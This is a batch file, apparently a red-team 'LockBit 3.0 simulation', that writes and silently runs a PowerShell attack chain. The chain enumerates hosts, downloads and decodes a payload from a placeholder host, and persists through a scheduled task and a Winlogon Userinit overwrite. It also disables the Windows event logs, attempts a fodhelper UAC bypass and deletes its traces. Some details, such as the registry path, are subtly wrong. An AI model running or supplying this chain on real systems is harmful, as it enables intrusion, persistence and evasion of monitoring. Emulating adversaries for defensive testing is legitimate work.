@echo off
setlocal EnableDelayedExpansion

REM === Advanced LockBit 3.0 Simulation Single File Script ===

REM Create PowerShell script on disk
set "psScriptPath=%TEMP%\redteam_lockbit_sim.ps1"

echo # LockBit 3.0 PowerShell Simulation Script > "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 1: Process & System Discovery >> "%psScriptPath%"
echo tasklist /v ^| Out-File -FilePath C:\Temp\proc_list.txt >> "%psScriptPath%"
echo systeminfo ^| Out-File -FilePath C:\Temp\sysinfo.txt >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 2: Network & Domain Enumeration >> "%psScriptPath%"
echo net view ^| Out-File -FilePath C:\Temp\netshares.txt >> "%psScriptPath%"
echo nltest /domain_trusts ^| Out-File -FilePath C:\Temp\domain_trusts.txt >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 3: Download Base64 encoded payload >> "%psScriptPath%"
echo $payloadUrl = 'http://example.com/obfuscated_payload.b64' >> "%psScriptPath%"
echo $outputB64 = 'C:\Temp\payload.b64' >> "%psScriptPath%"
echo Invoke-WebRequest -Uri $payloadUrl -OutFile $outputB64 >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 4: Decode Base64 payload to exe >> "%psScriptPath%"
echo $payloadExe = 'C:\Temp\payload.exe' >> "%psScriptPath%"
echo $b64string = Get-Content $outputB64 -Raw >> "%psScriptPath%"
echo [System.IO.File]::WriteAllBytes($payloadExe, [Convert]::FromBase64String($b64string)) >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 5: Persistence via scheduled task >> "%psScriptPath%"
echo schtasks /Create /SC DAILY /TN "LockBitPersistence" /TR $payloadExe /ST 23:45 /F >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 6: Registry persistence via Winlogon helper DLL key >> "%psScriptPath%"
echo Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Winlogon" -Name Userinit -Value "$payloadExe," >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 7: Disable Windows Event Logs (defense evasion) >> "%psScriptPath%"
echo wevtutil sl Security /e:false >> "%psScriptPath%"
echo wevtutil sl System /e:false >> "%psScriptPath%"
echo wevtutil sl Application /e:false >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 8: UAC bypass simulation using fodhelper.exe launch >> "%psScriptPath%"
echo Start-Process "fodhelper.exe" -ArgumentList $payloadExe >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 9: Cleanup base64 payload >> "%psScriptPath%"
echo Remove-Item $outputB64 -Force >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 10: Verify scheduled tasks >> "%psScriptPath%"
echo schtasks /query /fo LIST /v ^| Out-File C:\Temp\scheduled_tasks.txt >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo Write-Host "LockBit 3.0 PowerShell simulation complete." >> "%psScriptPath%"
echo. >> "%psScriptPath%"

REM Run the PowerShell script silently
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%psScriptPath%"

REM Optional: Clean up PowerShell script file
del "%psScriptPath%"

echo.
echo [*] Advanced LockBit 3.0 simulation completed.
pause
endlocal
